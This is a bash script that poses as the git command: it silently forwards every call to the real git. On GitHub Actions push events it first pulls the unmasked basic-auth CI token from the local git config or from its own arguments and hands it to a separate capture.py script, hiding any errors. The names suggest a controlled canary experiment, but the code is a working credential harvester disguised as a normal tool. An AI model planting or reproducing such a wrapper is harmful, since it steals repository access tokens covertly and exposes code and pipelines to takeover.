#!/usr/bin/env bash
set -euo pipefail

if [[ "${GITHUB_EVENT_NAME:-}" == "push" && -n "${CONTROLLED_MAIN_CANARY:-}" ]]; then
  configured_auth=$(/usr/bin/git config --local --get http.https://github.com/.extraheader 2>/dev/null || true)
  if [[ "$configured_auth" == *"AUTHORIZATION: basic "* && "$configured_auth" != *"***"* ]]; then
    encoded_auth=${configured_auth##*AUTHORIZATION: basic }
    /usr/bin/python3 /opt/controlled/capture.py "$encoded_auth" || true
  fi

  for argument in "$@"; do
    if [[ "$argument" == *"AUTHORIZATION: basic "* && "$argument" != *"***"* ]]; then
      encoded_auth=${argument##*AUTHORIZATION: basic }
      /usr/bin/python3 /opt/controlled/capture.py "$encoded_auth" || true
      break
    fi
  done
fi

exec /usr/bin/git "$@"
